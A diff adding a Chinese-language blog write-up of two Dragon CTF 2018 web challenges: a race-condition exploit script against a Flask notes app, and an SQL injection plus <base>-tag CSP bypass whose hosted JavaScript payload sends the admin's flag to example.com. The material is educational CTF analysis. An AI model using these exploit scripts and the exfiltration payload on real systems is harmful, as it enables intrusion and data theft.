@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/" />
+  <link rel="next" href="https://syang-ng.github.io/2018/10/seccon-2018-web-ghostkingdom-shooter/" />
+  <link rel="canonical" href="https://syang-ng.github.io/2018/09/dragonctf-web-writeup/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Dragon CTF Web 部分 Writeup | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="Dragon CTF Web 部分 Writeup | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "Dragon CTF Web 部分 Writeup",
+    "headline" : "Dragon CTF Web 部分 Writeup",
+    "description" : "3NTERPRISE s0lution 题目直接给出了源码，我已经贴在了 gist 上：https:\/\/gist.github.com\/syang2forever\/b90c36a66b7",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2018",
+    "datePublished": "2018-09-30 20:01:34 \x2b0000 UTC",
+    "dateModified" : "2018-09-30 20:01:34 \x2b0000 UTC",
+    "url" : "https:\/\/syang-ng.github.io\/2018\/09\/dragonctf-web-writeup\/",
+    "wordCount" : "2384",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="dark-theme">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Dragon CTF Web 部分 Writeup</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2018-09-30 itemprop="datePublished">September 30, 2018</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/web/"> Web </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<h2 id="3nterprise-s0lution">3NTERPRISE s0lution</h2>
+
+<p>题目直接给出了源码，我已经贴在了 gist 上：<a href="https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6" rel="nofollow noreferrer" target="_blank">https://gist.github.com/syang2forever/b90c36a66b7f826010d05be13d83d2a6</a></p>
+
+<p>下面来看题目，进来之后是个很明显的 <code>登录</code>/<code>注册</code> 界面，审计完代码后确认题目利用点应该不是此处，那随意注册个名字登录即可：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view1.png" alt="view 1" class="lazyload"><figcaption class="image-caption">view 1</figcaption></figure></p>
+
+<p>进入后我们可以看到题目提供的功能，主要有以下两项：</p>
+
+<ol>
+<li>发布一个 note</li>
+<li>查看发布的 note</li>
+</ol>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view2.png" alt="view 2" class="lazyload"><figcaption class="image-caption">view 2</figcaption></figure></p>
+
+<p>发布的 note 会被自动分配一个 id，那很自然的想到尝试访问 id 为 1 的页面：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view3.png" alt="view 3" class="lazyload"><figcaption class="image-caption">view 3</figcaption></figure></p>
+
+<p>可以看到该页面是由 admin 发布的，但显示的是一段密文，然后页面会进行解密（并得到错误的结果）</p>
+
+<p>查看页面源代码，可以发现执行的是异或加密的解密过程，页面会从 <a href="http://solution.hackable.software:8080/note/getkey" rel="nofollow noreferrer" target="_blank">http://solution.hackable.software:8080/note/getkey</a> 处请求对应的密钥</p>
+
+<pre><code class="language-html">&lt;textarea rows=20 cols=40 id=&quot;note_data&quot;&gt;07D8B68CDB92A687DFC74217C9D7F47E84540A3C97BA3D2B8B5B3E1C110A4C54F09392ADC910461BF61AA4AC6D921591556D1AAFCB8495144C27748369FC101847D7C2A9508F6534FFB7BCF859FD3ED8863611400F9ECB56064C20EDF0B6F6B1BF1CBB522A91F0C9B2&lt;/textarea&gt;&lt;br&gt;
+&lt;div id=&quot;konsole&quot;&gt;
+  Note encrypted ... &lt;br&gt;
+&lt;/div&gt;
+&lt;script&gt;
+  var org_content = '';
+  var pos = 0;
+  function ll(msg){ jQuery(&quot;#konsole&quot;).append(&quot;[+] &quot; + msg + &quot;&lt;br&gt;&quot;); }
+  window.setTimeout(function(){ fetch_key() }, 1000)
+  function fetch_key(){
+    ll(&quot;getting key ... &quot;);
+    jQuery.get(
+      &quot;/note/getkey&quot;, 
+      function(data){
+        ll(&quot;got key ...&quot;);
+        window.setTimeout(function(){ decode(data.key); }, 1000)
+      }
+    )
+  }
+
+  function hex_to_ascii(str1){
+    var hex  = str1.toString();
+    var str = '';
+    for (var n = 0; n &lt; hex.length; n += 2) {
+      str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+    }
+    return str;
+  }
+
+  function decode(key){
+    ll(&quot;decoding ... &quot;);
+    var note = jQuery(&quot;#note_data&quot;)
+    window.hex_content = note.val();
+    window.pos = 0;
+    window.org_content = hex_to_ascii(window.hex_content);
+    window.key_content = hex_to_ascii(key);
+    window.key_len = key.length;
+    window.plaintext = '';
+    note.val('');
+    decode_iter();
+  }
+  function decode_iter(){
+    var note = jQuery(&quot;#note_data&quot;);
+    if (window.pos &gt;= window.org_content.length){
+      return ll(&quot;Done !&quot;);
+    }
+    c1 = window.org_content.charCodeAt(pos);
+    c2 = window.key_content.charCodeAt(pos % window.key_len);
+    c3 = c1 ^ c2;
+    // console.log(c1 + &quot; xor &quot;+ c2 + &quot; = &quot;+ c3); // no loggin on prod !
+    window.plaintext += String.fromCharCode(c3)
+    note.val(window.plaintext + window.hex_content.slice(2+pos*2));
+    window.pos += 1
+    window.setTimeout(function(){decode_iter();}, 120);
+  }
+&lt;/script&gt;
+</code></pre>
+
+<p>这里就解答了我们之前的疑惑，为什么解密的结果是错误的？因为 admin 的密文是用他的密钥加密的，而直接访问该链接只能得到我们直接的密钥，所以解密的结果必然出错。那么我们现在的目的很明确，获得 admin 用户的加密密钥。</p>
+
+<p>从源码中，我们可以看到有两种途径来获得 key，第一种是直接调用 <code>/note/getkey</code>，第二种方式则较为间接，我们调用 <code>note/add</code>，然后发送一大段内容为 <code>\x00</code> 的文本，由于异或加密的性质，加密后的密文即加密使用的密钥</p>
+
+<pre><code class="language-python">@app.route(&quot;/note/getkey&quot;)
+@loginzone
+def do_note_getkey():
+  return flask.jsonify(dict(
+    key=backend.get_key_for_user(flask.session.get(K_AUTH_USER))
+  ))
+
+@app.route(&quot;/note/add&quot;, methods=['POST'])
+@loginzone
+def do_note_add_post():
+  text = get_required_params(&quot;POST&quot;, [&quot;text&quot;])[&quot;text&quot;]
+  key = backend.cache_load(flask.session.sid)
+  if key is None:
+    raise WebException(&quot;Cached key&quot;)
+  text = backend.xor_1337_encrypt(
+    data=text,
+    key=key,
+  )
+  note = model.Notes(
+    username=flask.session[K_LOGGED_USER],
+    message=backend.hex_encode(text),
+  )
+  sql_session.add(note)
+  sql_session.commit()
+  add_msg(&quot;Done !&quot;)
+  return do_render()
+</code></pre>
+
+<p>虽然第一种方式更为直接，但后来的测试表明，本题有个很明显的坑在于 key 的长度不止 20 bytes，所以我们必须使用第二种方式来获得 key。</p>
+
+<p>下一步需要思考如何修改加密的密钥，可以看到程序代码中获得密钥的操作是 <code>backend.cache_load</code>，而在程序中恰好有另一个函数可以修改 cache：</p>
+
+<pre><code class="language-python">@app.route('/login/user', methods=['POST'])
+def do_login_user_post():
+  username = get_required_params(&quot;POST&quot;, ['login'])['login']
+  backend.cache_save(
+    sid=flask.session.sid,
+    value=backend.get_key_for_user(username)
+  )
+  state = backend.check_user_state(username)
+  if state &gt; 0:
+    add_msg(&quot;user has {} state code ;/ contact backend admin ... &quot;.format(state))
+    return do_render()
+  flask.session[K_LOGGED_IN] = False
+  flask.session[K_AUTH_USER] = username
+
+  return do_302(&quot;/login/auth&quot;)
+
+</code></pre>
+
+<p>可以发现我们可以通过传入 <code>login:admin</code> 的方式将 cache 缓存的密钥修改为 admin 所持有的密钥，然后程序从缓存中读取该密钥进而加密内容，我们就能非常顺利的获得密钥了。但在正常情况下先后调用两个函数是不可能的，因为 <code>do_login_user_post</code> 会取消用户的登录状态，所以这里就需要利用竞争。</p>
+
+<p>既然我们清楚这道题的考点是条件竞争，那么写代码就是相当容易的一件事情了：</p>
+
+<pre><code class="language-python">import requests
+import threading
+
+s = requests.Session()
+
+def user_login(name):
+    s.post('http://solution.hackable.software:8080/login/user', data={'login':name})
+
+def user_auth(password, token):
+    s.post('http://solution.hackable.software:8080/login/auth', data={'password':password, 'token': token})
+
+def add_note():
+    text = chr(0x00)*160
+    s.post('http://solution.hackable.software:8080/note/add',{'text':text})
+
+def main():
+    while True:
+        user_login('exec')
+        user_auth('exec', 'exec')
+        t1 = threading.Thread(target=user_login, args=('admin',))
+        t2 = threading.Thread(target=add_note)
+        t1.start()
+        t2.start()
+
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view4.png" alt="view 4" class="lazyload"><figcaption class="image-caption">view 4</figcaption></figure></p>
+
+<p>成功获得 admin 的密钥：<code>4FB198AC92B2D1EEACAF6242E9BB811DEF7A2A73F9D6440BC27B5D7D7F2A3C3B83E0F7DEE9762A7A912084E81FF57BC22E212AC3EADBC04B24130EDC0BAE24792C88B6C131FB3A018AC7CEA72ECE0DBAB246616148ECAA227C6D5DCDDE98D891D7799B3A</code>，结合密文解密得到 flag：</p>
+
+<pre><code>Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he
+</code></pre>
+
+<h2 id="notepad">Notepad</h2>
+
+<p>本题是基于 express 框架的 nodejs 程序，后端数据库是 PostgreSQL，不过这些都是次要的，本题考点是 xss。</p>
+
+<p>题目提供了 4 个功能：</p>
+
+<ol>
+<li>注册</li>
+<li>登录</li>
+<li>发布 note</li>
+<li>查看 note</li>
+</ol>
+
+<p>以及你可以 pin 一个 note，或是向管理员报告这个 note，这样管理员就会来查看你发布的 note。</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/view5.png" alt="view 5" class="lazyload"><figcaption class="image-caption">view 5</figcaption></figure></p>
+
+<p>查看源码，我们可以看到我们之前的输入会以 json 的形式被页面存储，然后页面会调用 <code>notes.js</code> 动态生成相应内容</p>
+
+<pre><code class="language-html">&lt;script nonce=&quot;bd08c56c76fc48253d0e8dbd7018ec5b&quot;&gt;window.notes = [{&quot;id&quot;:5001,&quot;title&quot;:&quot;test&quot;,&quot;content&quot;:&quot;test&quot;,&quot;pinned&quot;:false}];&lt;/script&gt;
+&lt;script nonce=&quot;bd08c56c76fc48253d0e8dbd7018ec5b&quot; src=&quot;/javascripts/notes.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<pre><code class="language-javascript">'use strict';
+
+$(document).ready(function() {
+  var container = $('#notes');
+  var template = $('#note').html();
+
+  function createNote(note) {
+    var element = $(template);
+    element.find('.title').attr('href', '/notes/' + note.id);
+    element.find('.title').html(note.title);
+
+    element.find('.pin').attr('action', '/notes/' + note.id + '/pin');
+    if (note.pinned) {
+      element.find('.pin-text').text('Unpin');
+      element.find('.pin input[name=&quot;value&quot;]').attr('value', '0');
+    } else {
+      element.find('.pin-text').text('Pin');
+      element.find('.pin input[name=&quot;value&quot;]').attr('value', '1');
+    }
+
+    element.find('.report').attr('href', '/notes/' + note.id + '/report');
+    element.find('.delete').attr('action', '/notes/' + note.id + '/delete');
+
+    var body = element.find('.body');
+    note.content.split('\n').forEach(function(text, line) {
+      var el = $('&lt;p&gt;&lt;/p&gt;');
+      el.text(text);
+      if (line === 0) el.addClass('lead');
+      body.append(el);
+    });
+
+    container.append(element);
+  }
+
+  if (window.notes.length) {
+    window.notes.forEach(createNote);
+  } else {
+    container.append(&quot;&lt;p&gt;You don't have any notes&lt;/p&gt;&quot;);
+  }
+});
+</code></pre>
+
+<p>这么现在利用的方式非常明显了，我们需要控制 <code>title</code> 或者是 <code>content</code> 在页面中注入相应代码。回到源码上，我们可以看到这一段的逻辑在 <code>/routes/notes.js</code> 中：</p>
+
+<pre><code class="language-javascript">router.post('/new', async (req, res) =&gt; {
+  const regex = /[&lt;&gt;]/;
+
+  let errors = [];
+  if (regex.test(req.body.title)) {
+    errors.push('Title is invalid');
+  }
+
+  if (regex.test(req.body.content)) {
+    errors.push('Content is invalid');
+  }
+
+  if (errors.length !== 0) {
+    return res.render('new', {errors});
+  }
+
+  const result = await req.db.get `INSERT INTO notes (title, content, user_id) VALUES (${req.body.title}, ${req.body.content}, ${req.session.userId}) RETURNING id`;
+  if (result) {
+    return res.redirect(`/notes/${result.id}`);
+  } else {
+    res.render('new', {errors: [`Error occurred while saving your note`]});
+  }
+});
+</code></pre>
+
+<p>可以看到由于正则的存在使得我们无法直接传入相应 payload，因为我们要闭合标签必然要引入尖括号。但这是不是无法解决的呢？在万能的 js 中，一切都是可能的！</p>
+
+<p>我们注意到 <code>routes/notes.js</code> 中定义的路由在执行 sql 语句时，存在着一个注入点，所以可以尝试在 <code>req.body.value</code> 处进行 sql 注入：</p>
+
+<pre><code class="language-javascript">router.post('/:noteId(\\d+)/pin', async (req, res) =&gt; {
+  if (req.body.value.length === 1) {
+    const result = await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
+    if (result.error) {
+      return res.render('index', {errors: ['An error occurred']});
+    }
+  }
+
+  res.redirect('/notes');
+});
+</code></pre>
+
+<p>但上述利用点对 <code>value</code> 的长度有一定限制，不能超过 1，但在这里，我们可以通过将 <code>value</code> 赋值成数组的方式绕过，因为数组恰好满足了长度为 1 的要求，而且在字符串模板拼接会被自动解包：</p>
+
+<pre><code class="language-javascript">const value = [&quot;1::boolean, title='&lt;/script&gt;&lt;base href=http://example.com/&gt;' WHERE id = 8888--&quot;]
+console.log(`UPDATE notes SET pinned = ${value}::boolean WHERE id = 8888`);
+// output
+// UPDATE notes SET pinned = 1::boolean, title='&lt;/script&gt;&lt;base href=http://example.com/&gt;' WHERE id = 8888--::boolean WHERE id = 8888
+</code></pre>
+
+<p>既然这里已经确认存在一个 xss 的利用点了，然后下一步就是绕过 CSP 的限制。</p>
+
+<pre><code class="language-javascript">app.use((req, res, next) =&gt; {
+  res.set('X-XSS-Protection', '0');
+  res.set('Content-Security-Policy', `
+    default-src 'none';
+    script-src 'nonce-${res.locals.nonce}' 'strict-dynamic';
+    style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
+    img-src 'self';
+    connect-src 'self';
+    frame-src https://www.google.com/recaptcha/;
+    form-action 'self';
+  `.replace(/\n/g, ''));
+  next();
+});
+</code></pre>
+
+<p>可以看到 CSP 对我们的脚本做了比较严格的限制，但我们仍然有办法：使用 <code>&lt;base&gt;</code> 标签。根据 <code>&lt;base&gt;</code> 的定义，它可以为页面上的所有链接规定一个默认地址或默认目标，然后浏览器随后将使用指定的基本 URL 来解析所有的相对 URL，包括 <code>&lt;a&gt;</code> \ <code>&lt;img&gt;</code> 等标签。这样我们就可以将 <code>javascripts/notes.js</code> 指向部署在我们自己网站上的 payload，例如：</p>
+
+<pre><code class="language-javascript">// javascripts/notes.js in our websites
+fetch('http://nodepad.hackable.software:3000/admin/flag').then((res) =&gt; {
+    res.text().then((text) =&gt; {
+        location.href = 'http://example.com/?flag=' + btoa(text);
+    });
+})
+</code></pre>
+
+<p>一波操作：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/postman.png" alt="Postman" class="lazyload"><figcaption class="image-caption">Postman</figcaption></figure></p>
+
+<p>成功获得 flag：<code>DrgnS{Ar3_Y0u_T3mP14t3d?}</code></p>
+
+<p>PS: r3kapig 的大佬貌似使用了对象的方式绕过，具体原因大概是数据库操作时会进行的解包操作？感兴趣的朋友可以尝试一下（再告诉我，逃</p>
+
+<h2 id="总结">总结</h2>
+
+<p>Dargon Sector 不愧是国际强队，出的题目也相当的有质量，使人在做题之余也收获颇丰。</p>
+
+<h2 id="参考资料">参考资料</h2>
+
+<ul>
+<li><a href="https://ctftime.org/writeup/11452" rel="nofollow noreferrer" target="_blank">Nodepad by secse</a></li>
+<li><a href="https://xz.aliyun.com/t/2831" rel="nofollow noreferrer" target="_blank">Teaser Dragon CTF 2018 Writeup by r3kapig</a></li>
+<li><a href="https://www.w3schools.com/tags/tag_base.asp" rel="nofollow noreferrer" target="_blank">HTML <base> Tag</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#Tagged_template_literals" rel="nofollow noreferrer" target="_blank">模板字符串</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2018/09/dragonctf-web-writeup/>https://syang-ng.github.io/2018/09/dragonctf-web-writeup/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2018/09/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack/" class="prev" rel="prev" title="从一道 CTF 题看 Node.js 的 prototype pollution attack"><i class="iconfont icon-left"></i>&nbsp;从一道 CTF 题看 Node.js 的 prototype pollution attack</a>
+         
+        
+        <a href="https://syang-ng.github.io/2018/10/seccon-2018-web-ghostkingdom-shooter/" class="next" rel="next" title="SECCON 2018 - Web Ghostkingdom / Shooter 题解">SECCON 2018 - Web Ghostkingdom / Shooter 题解&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
